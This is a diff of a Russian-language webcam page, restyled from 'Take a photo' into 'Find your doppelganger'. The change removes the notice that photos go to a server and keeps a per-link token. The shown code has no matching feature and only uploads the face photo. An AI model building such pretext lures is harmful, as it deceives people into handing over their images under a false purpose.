@@ -1,80 +1,170 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Сделать фото </title>
-<style>
-body { font-family: Arial; padding:20px; max-width:700px; margin:auto; }
-h1 { color:#2b6cb0; }
-video, canvas { width:100%; border-radius:8px; background:#000; }
-button { margin-top:10px; padding:10px 16px; font-size:16px; border-radius:8px; cursor:pointer; }
-#status { margin-top:10px; color:#333; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Найди своего двойника 👯‍♂️</title>
+  <meta name="theme-color" content="#1e1e2f">
+  <meta name="description" content="Сделай фото и найди своего двойника 👯‍♂️! Работает прямо в браузере.">
+  <link rel="apple-touch-icon" href="/static/icon.png">
+
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", "Roboto", sans-serif;
+      background: radial-gradient(circle at 20% 20%, #1e1e2f, #111122);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      overflow: hidden;
+      opacity: 0;
+      transition: opacity 1s ease;
+    }
+
+    h1 {
+      font-size: 2.2em;
+      background: linear-gradient(90deg, #ff66cc, #66ccff, #9b5cff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #ccc;
+      max-width: 400px;
+      line-height: 1.6;
+      font-size: 15px;
+      margin: 0 20px 15px;
+    }
+
+    video, canvas {
+      width: 90%;
+      max-width: 420px;
+      border-radius: 20px;
+      background: #000;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+      margin-bottom: 10px;
+    }
+
+    button {
+      margin: 8px 5px;
+      padding: 12px 22px;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      background: linear-gradient(90deg, #ff66cc, #66ccff);
+      color: white;
+      transition: all 0.3s ease;
+    }
+
+    button:hover:not(:disabled) {
+      transform: scale(1.05);
+      box-shadow: 0 0 14px rgba(255, 255, 255, 0.3);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    #uploadBtn {
+      background: linear-gradient(90deg, #66ccff, #9b5cff);
+      box-shadow: 0 0 15px rgba(155, 92, 255, 0.6);
+    }
+
+    #status {
+      margin-top: 15px;
+      color: #ffccff;
+      font-size: 15px;
+    }
+  </style>
 </head>
 <body>
-<h1>Сделай фото 😊</h1>
-<p>Нажми «Включить камеру», дай разрешение, затем «Сделать фото». После «Отправить фото» изображение уйдёт на сервер.</p>
+  <h1>Найди своего двойника 👯‍♂️</h1>
+  <p>Нажми «Включить камеру», дай разрешение, сделай фото и узнай, на кого ты похож!</p>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas><br>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
-<button id="startBtn">Включить камеру</button>
-<button id="photoBtn" disabled>Сделать фото</button>
-<button id="uploadBtn" disabled>Искать двойника</button>
+  <div>
+    <button id="startBtn">📸 Включить камеру</button>
+    <button id="photoBtn" disabled>📷 Сделать фото</button>
+    <button id="uploadBtn" disabled>🔍 Искать двойника</button>
+  </div>
 
-<p id="status">Статус: ожидание</p>
+  <p id="status">Статус: ожидание</p>
 
-<script>
-const token = "{{TOKEN}}";
-const v = document.getElementById('video');
-const c = document.getElementById('canvas');
-const s = document.getElementById('status');
-const startBtn = document.getElementById('startBtn');
-const photoBtn = document.getElementById('photoBtn');
-const uploadBtn = document.getElementById('uploadBtn');
-let stream = null;
+  <script>
+    const token = "{{TOKEN}}";
+    const v = document.getElementById('video');
+    const c = document.getElementById('canvas');
+    const s = document.getElementById('status');
+    const startBtn = document.getElementById('startBtn');
+    const photoBtn = document.getElementById('photoBtn');
+    const uploadBtn = document.getElementById('uploadBtn');
+    let stream = null;
 
-startBtn.onclick = async () => {
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-    v.srcObject = stream;
-    photoBtn.disabled = false;
-    s.textContent = 'Камера включена. Нажми «Сделать фото».';
-  } catch (e) {
-    s.textContent = 'Ошибка доступа к камере: ' + e.message;
-  }
-};
+    window.addEventListener('load', () => {
+      document.body.style.opacity = '1';
+    });
 
-photoBtn.onclick = () => {
-  if (!stream) return;
-  c.width = v.videoWidth; c.height = v.videoHeight;
-  c.getContext('2d').drawImage(v, 0, 0);
-  c.style.display = 'block';
-  uploadBtn.disabled = false;
-  s.textContent = 'Фото готово. Можно отправлять.';
-};
-
-uploadBtn.onclick = () => {
-  c.toBlob(async (blob) => {
-    if (!blob) { s.textContent = 'Не удалось получить изображение.'; return; }
-    const fd = new FormData();
-    fd.append('photo', blob, 'photo.png');
-    fd.append('token', token);
-    s.textContent = 'Отправка...';
-    try {
-      const r = await fetch('/upload_photo', { method: 'POST', body: fd });
-      const j = await r.json();
-      if (r.ok) {
-        s.innerHTML = 'Фото загружено: <a href="' + j.url + '" target="_blank" rel="noopener">открыть</a>';
-      } else {
-        s.textContent = 'Ошибка: ' + (j.error || r.statusText);
+    startBtn.onclick = async () => {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        v.srcObject = stream;
+        photoBtn.disabled = false;
+        s.textContent = 'Камера включена ✅ Нажми «Сделать фото».';
+      } catch (e) {
+        s.textContent = 'Ошибка доступа к камере: ' + e.message;
       }
-    } catch (e) {
-      s.textContent = 'Ошибка сети: ' + e.message;
-    }
-  }, 'image/png');
-};
-</script>
+    };
+
+    photoBtn.onclick = () => {
+      if (!stream) return;
+      c.width = v.videoWidth;
+      c.height = v.videoHeight;
+      c.getContext('2d').drawImage(v, 0, 0);
+      c.style.display = 'block';
+      uploadBtn.disabled = false;
+      s.textContent = 'Фото готово 🌟 Теперь можешь искать двойника!';
+    };
+
+    uploadBtn.onclick = () => {
+      uploadBtn.disabled = true;
+      s.textContent = '📤 Отправка...';
+
+      c.toBlob(async (blob) => {
+        if (!blob) {
+          s.textContent = 'Не удалось получить изображение 😢';
+          uploadBtn.disabled = false;
+          return;
+        }
+
+        const fd = new FormData();
+        fd.append('photo', blob, 'photo.png');
+        fd.append('token', token);
+
+        try {
+          const r = await fetch('/upload_photo', { method: 'POST', body: fd });
+          const j = await r.json();
+          if (r.ok) {
+            s.innerHTML = 'Фото загружено ✅ <a href="' + j.url + '" target="_blank" rel="noopener">Открыть</a>';
+          } else {
+            s.textContent = 'Ошибка: ' + (j.error || r.statusText);
+          }
+        } catch (e) {
+          s.textContent = 'Ошибка сети: ' + e.message;
+        } finally {
+          uploadBtn.disabled = false;
+        }
+      }, 'image/png');
+    };
+  </script>
 </body>
 </html>
